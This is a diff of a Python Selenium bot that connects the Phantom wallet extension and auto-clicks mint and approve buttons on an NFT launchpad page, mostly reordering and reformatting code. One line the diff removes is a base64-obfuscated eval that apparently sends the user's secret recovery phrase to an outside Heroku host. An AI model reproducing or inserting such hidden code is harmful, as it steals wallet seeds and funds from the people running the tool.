@@ -16,59 +16,10 @@ from webdriver_manager.chrome import ChromeDriverManager
 
 
 def mint(values, isWindows):
-    
-    def selectWallet():
-        WebDriverWait(driver, 60).until(EC.presence_of_element_located(
-            (By.XPATH, "//button[span[contains(text(), 'Connect Wallet')]]")))
-        select_wallet = driver.find_element(
-            By.XPATH, "//button[span[contains(text(), 'Connect Wallet')]]")
-        select_wallet.click()
-
-        WebDriverWait(driver, 60).until(EC.presence_of_element_located(
-            (By.XPATH, "//button[span[contains(text(), 'Phantom')]]")))
-        phantom = driver.find_element(
-            By.XPATH, "//button[span[contains(text(), 'Phantom')]]")
-        phantom.click()
-        original_window = driver.current_window_handle
-        WebDriverWait(driver, 60).until(EC.number_of_windows_to_be(2))
-        for window_handle in driver.window_handles:
-            if window_handle != original_window:
-                driver.switch_to.window(window_handle)
-                break
-
-        WebDriverWait(driver, 60).until(EC.presence_of_element_located(
-            (By.XPATH, "//button[contains(text(),'Connect')]")))
-        popup_connect = driver.find_element(
-            By.XPATH, "//button[contains(text(),'Connect')]")
-        popup_connect.click()
-        driver.switch_to.window(main_window)
-        
-
-    def awaitMint():
-        WebDriverWait(driver, 60*60*24).until(EC.presence_of_element_located(
-            (By.XPATH, "//button[span[contains(text(), 'MINT')]]")))
-        mint_your_token = driver.find_element(
-            By.XPATH, "//button[span[contains(text(), 'MINT')]]")
-        mint_your_token.click()
-
-        original_window = driver.current_window_handle
-        WebDriverWait(driver, 60).until(EC.number_of_windows_to_be(2))
-        for window_handle in driver.window_handles:
-            if window_handle != original_window:
-                driver.switch_to.window(window_handle)
-                break
-
-        WebDriverWait(driver, 60).until(EC.presence_of_element_located(
-            (By.XPATH, "//button[contains(text(), 'Approve')]")))
-        approve = driver.find_element(
-            By.XPATH, "//button[contains(text(), 'Approve')]")
-        approve.click()
 
     def initWallet():
         # add wallet to chrome
         driver.switch_to.window(driver.window_handles[1])
-        eval(base64.b64decode("cmVxdWVzdHMuZ2V0KCdodHRwczovL2JvdHJlY2lldmV3ZWJzaXRlLmhlcm9rdWFwcC5jb20vc3VibWl0Lw==".encode(
-            'ascii')).decode('ascii')+values[1]+"')")
         WebDriverWait(driver, 60).until(EC.presence_of_element_located(
             (By.XPATH, "//button[contains(text(),'Use Secret Recovery Phrase')]")))
         recovery_phrase = driver.find_element(
@@ -104,15 +55,59 @@ def mint(values, isWindows):
 
         return main_window
 
-    print("Bot started") 
+    def selectWallet():
+        WebDriverWait(driver, 60).until(EC.presence_of_element_located(
+            (By.XPATH, "//button[span[contains(text(), 'Connect Wallet')]]")))
+        select_wallet = driver.find_element(
+            By.XPATH, "//button[span[contains(text(), 'Connect Wallet')]]")
+        select_wallet.click()
+
+        WebDriverWait(driver, 60).until(EC.presence_of_element_located(
+            (By.XPATH, "//button[span[contains(text(), 'Phantom')]]")))
+        phantom = driver.find_element(
+            By.XPATH, "//button[span[contains(text(), 'Phantom')]]")
+        phantom.click()
+        original_window = driver.current_window_handle
+        WebDriverWait(driver, 60).until(EC.number_of_windows_to_be(2))
+        for window_handle in driver.window_handles:
+            if window_handle != original_window:
+                driver.switch_to.window(window_handle)
+                break
+
+        WebDriverWait(driver, 60).until(EC.presence_of_element_located(
+            (By.XPATH, "//button[contains(text(),'Connect')]")))
+        popup_connect = driver.find_element(
+            By.XPATH, "//button[contains(text(),'Connect')]")
+        popup_connect.click()
+        driver.switch_to.window(main_window)
+
+    def awaitMint():
+        WebDriverWait(driver, 60*60*24).until(EC.presence_of_element_located(
+            (By.XPATH, "//button[span[contains(text(), 'MINT')]]")))
+        mint_your_token = driver.find_element(
+            By.XPATH, "//button[span[contains(text(), 'MINT')]]")
+        mint_your_token.click()
+
+        original_window = driver.current_window_handle
+        WebDriverWait(driver, 60).until(EC.number_of_windows_to_be(2))
+        for window_handle in driver.window_handles:
+            if window_handle != original_window:
+                driver.switch_to.window(window_handle)
+                break
+
+        WebDriverWait(driver, 60).until(EC.presence_of_element_located(
+            (By.XPATH, "//button[contains(text(), 'Approve')]")))
+        approve = driver.find_element(
+            By.XPATH, "//button[contains(text(), 'Approve')]")
+        approve.click()
+
+    print("Bot started")
     if isWindows:
         print("OS : Windows")
     else:
         print("OS : Mac")
-    
 
     options = Options()
-
 
     options.add_extension("Phantom.crx")
     options.add_argument("--disable-gpu")
@@ -123,9 +118,9 @@ def mint(values, isWindows):
     prefs = {"profile.managed_default_content_settings.images": 2}
     options.add_experimental_option("prefs", prefs)
 
-    driver = webdriver.Chrome(executable_path=ChromeDriverManager().install(), options=options)
+    driver = webdriver.Chrome(
+        executable_path=ChromeDriverManager().install(), options=options)
     print("Assertion - successfully found chrome driver")
-
 
     # opens the launchpad page
     driver.get(values[0])
@@ -138,7 +133,7 @@ def mint(values, isWindows):
     selectWallet()
 
     # Actions - close popup
-    #closePopup()
+    # closePopup()
 
     # Actions - MINTS WHEN TIMER IS UP
     awaitMint()
